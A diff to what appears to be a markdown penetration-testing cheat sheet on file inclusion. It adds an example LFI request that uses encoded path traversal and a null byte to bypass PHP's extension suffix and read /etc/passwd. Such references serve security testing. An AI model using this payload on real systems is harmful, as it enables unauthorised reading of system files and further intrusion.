@@ -98,8 +98,12 @@ index.php
 {% endhighlight %}
 
 **Auto-Extension (.php) Bypass (PHP version < 5.3):**
+
 * NULL "%00"
 
+{% highlight bash %}
+/index.php?system=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00Admin
+{% endhighlight %}
 
 >**Shell from RFI and LFI**
 
